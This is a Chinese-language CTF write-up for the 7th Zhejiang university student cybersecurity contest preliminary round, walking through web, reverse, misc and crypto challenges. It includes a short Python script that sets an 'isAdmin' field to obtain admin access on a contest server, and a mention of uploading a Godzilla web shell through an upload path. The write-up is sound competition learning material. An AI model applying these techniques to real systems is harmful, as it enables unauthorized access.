# 第七届浙江省大学生网络与信息安全竞赛预赛 Writeup

第七届浙江省大学生网络与信息安全竞赛预赛 Writeup
&lt;!--more--&gt;
## 前言
运气好摸了个第一，抢了仨一血很舒服hh，队友也很给力✌
![alt text](/images/ZJSS-s7/image-12.png)

## 签到
### 网安知识大挑战
手做了几遍做不出来，于是去抓包，发现抓不到，那么就是本地验证的了

找到了check的地方，发现flag是调用`d()`得到的，在这打个断点，点提交答案会断下来
![alt text](/images/ZJSS-s7/image-5.png)

然后再控制台里输入`d()`执行一下，就得到flag了
![alt text](/images/ZJSS-s7/image-6.png)

### 签到题
就是套base
Base92 &gt; base85 &gt; base64 &gt; base62(ascii) &gt; base58 &gt; base45 &gt; base32
![alt text](/images/ZJSS-s7/image-7.png)
## Web
### easyjs
下载源码，乍一看以为是原型链污染，仔细理一下代码逻辑发现并不是

往`/api/notes`路径下POST传入json，内容为`{&#34;id&#34;: 1, &#34;isAdmin&#34;: 1}`
`id`的值随意，跟一个isAdmin并确保能过`/api/flag`路径下的判断

在请求头中传入`note-id`即可获得flag
这里用python脚本实现，burp有bug
```python
import requests

url = &#34;http://139.155.126.78:32940&#34;
data = {&#34;id&#34;: 1, &#34;isAdmin&#34;: 1}
headers = {&#34;note-id&#34;: &#34;1&#34;}

res = requests.post(url &#43; &#34;/api/notes&#34;, json=data)
print(res.text)

res2 = requests.get(url &#43; &#34;/api/notes/1&#34;)
print(res2.text)

res3 = requests.get(url &#43; &#34;/api/flag&#34;, headers=headers)
print(res3.text)
```

### 2. hack memory
扫目录，发现`upload`，哥斯拉生成shell直接上传
getshell后在根目录得到flag
![alt text](/images/ZJSS-s7/image-11.png)

## Reverse
### ezRe
题目给了一个pyc文件，pycdc反编译不出来，那就pycdas反编译字节码然后翻译成python代码
```python
import base64

text = input(&#34;Flag: &#34;)
key = [ord(i) ^ 102 for i in &#39;7e021a7dd49e4bd0837e22129682551b&#39;]

s = list(range(256))
j = 0
for i in range(256):
    j = (j &#43; s[i] &#43; key[i % len(key)]) % 256
    s[i], s[j] = s[j], s[i]

i = j = 0
data = []
for _ in range(50):
    i = (i &#43; 1) % 256
    j = (j &#43; s[i]) % 256
    s[i], s[j] = s[j], s[i]
    data.append(s[(s[i] &#43; s[j]) % 256])

result = &#39;&#39;
for c, k in zip(text, data):
    result &#43;= chr(ord(c) ^ k ^ 51)

enc = base64.b64encode(result.encode()).decode()
if enc == &#39;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#39;:
    print(&#39;yes!&#39;)
else:
    print(&#39;try again...&#39;)
```
很明显就是一个rc4，最后多异或个51，key异或102，注意这个密文utf8编码的问题，要decode一下，卡了半天...

exp:
```python
import base64

cipher = &#39;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#39;
e = base64.b64decode(cipher).decode()

key = [ord(i) ^ 102 for i in &#39;7e021a7dd49e4bd0837e22129682551b&#39;]

s = list(range(256))
j = 0
for i in range(256):
    j = (j &#43; s[i] &#43; key[i % len(key)]) % 256
    s[i], s[j] = s[j], s[i]

i = j = 0
data = []
for _ in range(50):
    i = (i &#43; 1) % 256
    j = (j &#43; s[i]) % 256
    s[i], s[j] = s[j], s[i]
    data.append(s[(s[i] &#43; s[j]) % 256])

flag = &#39;&#39;
for c, k in zip(e, data):
    flag &#43;= chr(ord(c) ^ k ^ 51)

print(flag)
```
### MidMath
题目从out文件中读取数据，随机生成路径并进行路径计算，需要找到一条正确的路径，加起来大于6668912

动态规划计算出最优路径即可
```python
import hashlib

def md5_16bit(s):
    m = hashlib.md5(s.encode(&#39;utf-8&#39;)).hexdigest()
    res = m[8:24]
    return res

def find_max_path():
    matrix = []

    with open(&#39;out&#39;, &#39;r&#39;) as f:
        row = 1
        curr_row = []
        for num in f.read().split():
            curr_row.append(int(num))
            if len(curr_row) == row:
                matrix.append(curr_row)
                row &#43;= 1
                curr_row = []


    n = len(matrix)
    # dp[i][j] 存储到达位置(i,j)的最大路径和
    dp = [[0] * n for _ in range(n)]
    # path[i][j] 存储到达位置(i,j)的路径选择（1表示向下，2表示向右下）
    path = [[0] * n for _ in range(n)]
    
    dp[0][0] = matrix[0][0]
    
    # 填充dp表
    for i in range(n-1):
        for j in range(i&#43;1):
            if dp[i&#43;1][j] &lt; dp[i][j] &#43; matrix[i&#43;1][j]:
                dp[i&#43;1][j] = dp[i][j] &#43; matrix[i&#43;1][j]
                path[i][j] = 1
            
            if dp[i&#43;1][j&#43;1] &lt; dp[i][j] &#43; matrix[i&#43;1][j&#43;1]:
                dp[i&#43;1][j&#43;1] = dp[i][j] &#43; matrix[i&#43;1][j&#43;1]
                path[i][j] = 2

    # 找出最后一行的最大值
    max_sum = max(dp[-1])

    # 回溯找出路径 
    final_path = []
    curr_j = dp[-1].index(max_sum)
    curr_i = n - 1
    while curr_i &gt; 0:
        if curr_j == 0 or (curr_j &lt;= curr_i and dp[curr_i-1][curr_j-1] &lt; dp[curr_i-1][curr_j]):
            final_path.append(1) 
            curr_i -= 1
        else:
            final_path.append(2) 
            curr_i -= 1
            curr_j -= 1
    
    final_path = final_path[::-1] 
    return &#39;&#39;.join(str(x) for x in final_path)
    

if __name__ == &#34;__main__&#34;:
    path = find_max_path()
    print(md5_16bit(path))
```

### Midre
有一些简单的花指令nop一下，main函数中将输入异或`what&#39;s this`
![alt text](/images/ZJSS-s7/image.png)

然后修改返回地址跳到另一个函数，就一个AES加密，key和iv都是明文的
![alt text](/images/ZJSS-s7/image-1.png)

厨子直接解一下就完事了
![alt text](/images/ZJSS-s7/image-2.png)

## Misc
### RealSignin
010查看文件底部发现一段加密 直接解不出来
![alt text](/images/ZJSS-s7/image-8.png)

Stegsolve找lsb有一段类似base64表
![alt text](/images/ZJSS-s7/image-9.png)

Base64换表解码得到flag

![alt text](/images/ZJSS-s7/image-10.png)

## 信创安全
### sm4rev
题目给了一个shell文件，解压elf到tmp目录然后执行

手动运行一下，以迅雷不及掩耳之势从tmp目录下拿到释放出来的文件，逆向分析一下

结合题目名字，这题应该就一个sm4加密了，找到key和密文
![alt text](/images/ZJSS-s7/image-3.png)

用厨子解一下就完事了
![alt text](/images/ZJSS-s7/image-4.png)

---

> Author: yuro  
> URL: /posts/8e67efa/  

